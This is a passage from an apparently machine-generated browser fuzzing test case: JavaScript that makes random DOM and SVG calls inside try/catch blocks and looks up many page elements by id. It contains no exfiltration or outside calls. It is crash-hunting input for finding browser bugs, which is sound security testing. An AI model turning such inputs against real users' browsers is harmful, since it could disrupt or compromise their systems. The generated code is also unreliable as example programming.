try { if (!var00357) { var00357 = GetVariable(fuzzervars, 'Text'); } else { SetVariable(var00357, 'Text'); SetVariable(var00357, 'CharacterData'); SetVariable(var00357, 'Element'); SetVariable(var00357, 'GlobalEventHandlers'); SetVariable(var00357, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00356:Text} */ var var00356 = var00357.splitText(-1); } catch(e) { }
try { if (!var00356) { var00356 = GetVariable(fuzzervars, 'Text'); } else { SetVariable(var00356, 'Text'); SetVariable(var00356, 'CharacterData'); SetVariable(var00356, 'Element'); SetVariable(var00356, 'GlobalEventHandlers'); SetVariable(var00356, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00355:Text} */ var var00355 = var00356.splitText(0); } catch(e) { }
try { if (!var00355) { var00355 = GetVariable(fuzzervars, 'Text'); } else { SetVariable(var00355, 'Text'); SetVariable(var00355, 'CharacterData'); SetVariable(var00355, 'Element'); SetVariable(var00355, 'GlobalEventHandlers'); SetVariable(var00355, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00354:Text} */ var var00354 = var00355.splitText(0); } catch(e) { }
try { if (!var00354) { var00354 = GetVariable(fuzzervars, 'Text'); } else { SetVariable(var00354, 'Text'); SetVariable(var00354, 'CharacterData'); SetVariable(var00354, 'Element'); SetVariable(var00354, 'GlobalEventHandlers'); SetVariable(var00354, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00353:Text} */ var var00353 = var00354.splitText(0); } catch(e) { }
try { if (!var00353) { var00353 = GetVariable(fuzzervars, 'Text'); } else { SetVariable(var00353, 'Text'); SetVariable(var00353, 'CharacterData'); SetVariable(var00353, 'Element'); SetVariable(var00353, 'GlobalEventHandlers'); SetVariable(var00353, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00352:Text} */ var var00352 = var00353.splitText(0); } catch(e) { }
try { if (!var00352) { var00352 = GetVariable(fuzzervars, 'Text'); } else { SetVariable(var00352, 'Text'); SetVariable(var00352, 'CharacterData'); SetVariable(var00352, 'Element'); SetVariable(var00352, 'GlobalEventHandlers'); SetVariable(var00352, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00360:DOMString} */ var var00360 = htmlvar00028.csp; } catch(e) { }
try { /* newvar{var00361:DOMString} */ var var00361 = var00224.validationMessage; } catch(e) { }
try { /* newvar{var00362:boolean} */ var var00362 = htmlvar00038.spellcheck; } catch(e) { }
try { document.all[12%document.all.length].appendChild(var00193); } catch(e) { }
try { htmlvar00004.align = "CENTER"; } catch(e) { }
try { svgvar00019.setAttribute("word-spacing", "0em"); } catch(e) { }
try { var00274.src = "x"; } catch(e) { }
try { htmlvar00008.setAttribute("prompt", "" + String.fromCharCode(88, 115, 103, 94, 40, 58, 106, 119, 53, 61, 96, 58, 99, 62, 123, 114, 45, 82, 79, 114) + ""); } catch(e) { }
try { /* newvar{var00363:boolean} */ var var00363 = var00343.valid; } catch(e) { }
try { /* newvar{var00366:SVGAnimatedTransformList} */ var var00366 = svgvar00003.transform; } catch(e) { }
try { if (!var00366) { var00366 = GetVariable(fuzzervars, 'SVGAnimatedTransformList'); } else { SetVariable(var00366, 'SVGAnimatedTransformList');  } } catch(e) { }
try { /* newvar{var00365:SVGTransformList} */ var var00365 = var00366.baseVal; } catch(e) { }
try { if (!var00365) { var00365 = GetVariable(fuzzervars, 'SVGTransformList'); } else { SetVariable(var00365, 'SVGTransformList');  } } catch(e) { }
try { /* newvar{var00364:SVGTransform} */ var var00364 = var00365.createSVGTransformFromMatrix(var00247); } catch(e) { }
try { if (!var00364) { var00364 = GetVariable(fuzzervars, 'SVGTransform'); } else { SetVariable(var00364, 'SVGTransform');  } } catch(e) { }
try { /* newvar{var00367:DOMString} */ var var00367 = var00005.target; } catch(e) { }
try { /* newvar{var00368:SVGElement} */ var var00368 = svgvar00012.replaceChild(svgvar00026,svgvar00012.childNodes[67%svgvar00012.childNodes.length]); } catch(e) { }
try { if (!var00368) { var00368 = GetVariable(fuzzervars, 'SVGElement'); } else { SetVariable(var00368, 'SVGElement'); SetVariable(var00368, 'GlobalEventHandlers'); SetVariable(var00368, 'EventTarget'); SetVariable(var00368, 'GlobalEventHandlers');  } } catch(e) { }
try { /* newvar{var00369:CSSStyleDeclaration} */ var var00369 = var00359.style; } catch(e) { }
try { if (!var00369) { var00369 = GetVariable(fuzzervars, 'CSSStyleDeclaration'); } else { SetVariable(var00369, 'CSSStyleDeclaration');  } } catch(e) { }
//endjs
var fuzzervars = {};
freememory()
}
function eventhandler1() {
runcount["eventhandler1"]++; if(runcount["eventhandler1"] > 2) { return; }
var fuzzervars = {};
SetVariable(fuzzervars, window, 'Window');
SetVariable(fuzzervars, document, 'Document');
SetVariable(fuzzervars, document.body.firstChild, 'Element');
//beginjs
/* newvar{htmlvar00001:HTMLQuoteElement} */ var htmlvar00001 = document.getElementById("htmlvar00001"); //HTMLQuoteElement
/* newvar{htmlvar00002:HTMLStyleElement} */ var htmlvar00002 = document.getElementById("htmlvar00002"); //HTMLStyleElement
/* newvar{htmlvar00003:HTMLMenuElement} */ var htmlvar00003 = document.getElementById("htmlvar00003"); //HTMLMenuElement
/* newvar{htmlvar00004:HTMLTableElement} */ var htmlvar00004 = document.getElementById("htmlvar00004"); //HTMLTableElement
/* newvar{htmlvar00005:HTMLTableSectionElement} */ var htmlvar00005 = document.getElementById("htmlvar00005"); //HTMLTableSectionElement
/* newvar{htmlvar00006:HTMLTableRowElement} */ var htmlvar00006 = document.getElementById("htmlvar00006"); //HTMLTableRowElement
/* newvar{htmlvar00007:HTMLTableCellElement} */ var htmlvar00007 = document.getElementById("htmlvar00007"); //HTMLTableCellElement
/* newvar{htmlvar00008:HTMLTableCellElement} */ var htmlvar00008 = document.getElementById("htmlvar00008"); //HTMLTableCellElement
/* newvar{htmlvar00009:HTMLDataElement} */ var htmlvar00009 = document.getElementById("htmlvar00009"); //HTMLDataElement
/* newvar{htmlvar00010:HTMLTableRowElement} */ var htmlvar00010 = document.getElementById("htmlvar00010"); //HTMLTableRowElement
/* newvar{htmlvar00011:HTMLTableCellElement} */ var htmlvar00011 = document.getElementById("htmlvar00011"); //HTMLTableCellElement
/* newvar{htmlvar00012:HTMLProgressElement} */ var htmlvar00012 = document.getElementById("htmlvar00012"); //HTMLProgressElement
/* newvar{htmlvar00013:HTMLParagraphElement} */ var htmlvar00013 = document.getElementById("htmlvar00013"); //HTMLParagraphElement
/* newvar{htmlvar00014:HTMLLinkElement} */ var htmlvar00014 = document.getElementById("htmlvar00014"); //HTMLLinkElement
/* newvar{htmlvar00015:HTMLMetaElement} */ var htmlvar00015 = document.getElementById("htmlvar00015"); //HTMLMetaElement
/* newvar{htmlvar00016:HTMLShadowElement} */ var htmlvar00016 = document.getElementById("htmlvar00016"); //HTMLShadowElement
/* newvar{htmlvar00017:HTMLTableCellElement} */ var htmlvar00017 = document.getElementById("htmlvar00017"); //HTMLTableCellElement
/* newvar{htmlvar00018:HTMLBRElement} */ var htmlvar00018 = document.getElementById("htmlvar00018"); //HTMLBRElement
/* newvar{htmlvar00019:HTMLDialogElement} */ var htmlvar00019 = document.getElementById("htmlvar00019"); //HTMLDialogElement
/* newvar{htmlvar00020:HTMLTextAreaElement} */ var htmlvar00020 = document.getElementById("htmlvar00020"); //HTMLTextAreaElement
/* newvar{htmlvar00021:HTMLDialogElement} */ var htmlvar00021 = document.getElementById("htmlvar00021"); //HTMLDialogElement
/* newvar{htmlvar00022:HTMLUnknownElement} */ var htmlvar00022 = document.getElementById("htmlvar00022"); //HTMLUnknownElement
/* newvar{htmlvar00023:HTMLFormElement} */ var htmlvar00023 = document.getElementById("htmlvar00023"); //HTMLFormElement
/* newvar{htmlvar00024:HTMLObjectElement} */ var htmlvar00024 = document.getElementById("htmlvar00024"); //HTMLObjectElement
/* newvar{htmlvar00025:HTMLParamElement} */ var htmlvar00025 = document.getElementById("htmlvar00025"); //HTMLParamElement
/* newvar{htmlvar00026:HTMLUnknownElement} */ var htmlvar00026 = document.getElementById("htmlvar00026"); //HTMLUnknownElement
/* newvar{htmlvar00027:HTMLImageElement} */ var htmlvar00027 = document.getElementById("htmlvar00027"); //HTMLImageElement
/* newvar{htmlvar00028:HTMLIFrameElement} */ var htmlvar00028 = document.getElementById("htmlvar00028"); //HTMLIFrameElement
/* newvar{htmlvar00029:HTMLMetaElement} */ var htmlvar00029 = document.getElementById("htmlvar00029"); //HTMLMetaElement
/* newvar{svgvar00001:SVGSVGElement} */ var svgvar00001 = document.getElementById("svgvar00001"); //SVGSVGElement
/* newvar{svgvar00002:SVGDiscardElement} */ var svgvar00002 = document.getElementById("svgvar00002"); //SVGDiscardElement
/* newvar{svgvar00003:SVGDefsElement} */ var svgvar00003 = document.getElementById("svgvar00003"); //SVGDefsElement
/* newvar{svgvar00004:SVGLineElement} */ var svgvar00004 = document.getElementById("svgvar00004"); //SVGLineElement
/* newvar{svgvar00005:SVGDefsElement} */ var svgvar00005 = document.getElementById("svgvar00005"); //SVGDefsElement
/* newvar{svgvar00006:SVGFEMergeElement} */ var svgvar00006 = document.getElementById("svgvar00006"); //SVGFEMergeElement
/* newvar{svgvar00007:SVGFEMergeNodeElement} */ var svgvar00007 = document.getElementById("svgvar00007"); //SVGFEMergeNodeElement
/* newvar{svgvar00008:SVGPathElement} */ var svgvar00008 = document.getElementById("svgvar00008"); //SVGPathElement
/* newvar{svgvar00009:SVGAnimateElement} */ var svgvar00009 = document.getElementById("svgvar00009"); //SVGAnimateElement
/* newvar{svgvar00010:SVGAnimateTransformElement} */ var svgvar00010 = document.getElementById("svgvar00010"); //SVGAnimateTransformElement
/* newvar{svgvar00011:SVGAnimateTransformElement} */ var svgvar00011 = document.getElementById("svgvar00011"); //SVGAnimateTransformElement
/* newvar{svgvar00012:SVGAnimateTransformElement} */ var svgvar00012 = document.getElementById("svgvar00012"); //SVGAnimateTransformElement
/* newvar{svgvar00013:SVGAnimateMotionElement} */ var svgvar00013 = document.getElementById("svgvar00013"); //SVGAnimateMotionElement
/* newvar{svgvar00014:SVGSymbolElement} */ var svgvar00014 = document.getElementById("svgvar00014"); //SVGSymbolElement
/* newvar{htmlvar00030:HTMLFontElement} */ var htmlvar00030 = document.getElementById("htmlvar00030"); //HTMLFontElement
/* newvar{svgvar00015:SVGFEDistantLightElement} */ var svgvar00015 = document.getElementById("svgvar00015"); //SVGFEDistantLightElement
/* newvar{svgvar00016:SVGLinearGradientElement} */ var svgvar00016 = document.getElementById("svgvar00016"); //SVGLinearGradientElement
/* newvar{svgvar00017:SVGFESpotLightElement} */ var svgvar00017 = document.getElementById("svgvar00017"); //SVGFESpotLightElement
/* newvar{svgvar00018:SVGTSpanElement} */ var svgvar00018 = document.getElementById("svgvar00018"); //SVGTSpanElement
/* newvar{svgvar00019:SVGForeignObjectElement} */ var svgvar00019 = document.getElementById("svgvar00019"); //SVGForeignObjectElement
/* newvar{svgvar00020:SVGAnimateElement} */ var svgvar00020 = document.getElementById("svgvar00020"); //SVGAnimateElement
/* newvar{svgvar00021:SVGFEConvolveMatrixElement} */ var svgvar00021 = document.getElementById("svgvar00021"); //SVGFEConvolveMatrixElement
/* newvar{svgvar00022:SVGAnimateElement} */ var svgvar00022 = document.getElementById("svgvar00022"); //SVGAnimateElement
/* newvar{svgvar00023:SVGSetElement} */ var svgvar00023 = document.getElementById("svgvar00023"); //SVGSetElement
/* newvar{svgvar00024:SVGLinearGradientElement} */ var svgvar00024 = document.getElementById("svgvar00024"); //SVGLinearGradientElement
/* newvar{svgvar00025:SVGAnimateTransformElement} */ var svgvar00025 = document.getElementById("svgvar00025"); //SVGAnimateTransformElement
/* newvar{svgvar00026:SVGCursorElement} */ var svgvar00026 = document.getElementById("svgvar00026"); //SVGCursorElement
/* newvar{svgvar00027:SVGTSpanElement} */ var svgvar00027 = document.getElementById("svgvar00027"); //SVGTSpanElement
/* newvar{htmlvar00031:HTMLDataElement} */ var htmlvar00031 = document.getElementById("htmlvar00031"); //HTMLDataElement
/* newvar{htmlvar00032:HTMLFontElement} */ var htmlvar00032 = document.getElementById("htmlvar00032"); //HTMLFontElement
/* newvar{htmlvar00033:HTMLKeygenElement} */ var htmlvar00033 = document.getElementById("htmlvar00033"); //HTMLKeygenElement
</script>
</head>
<body>
</body>
</html>
```
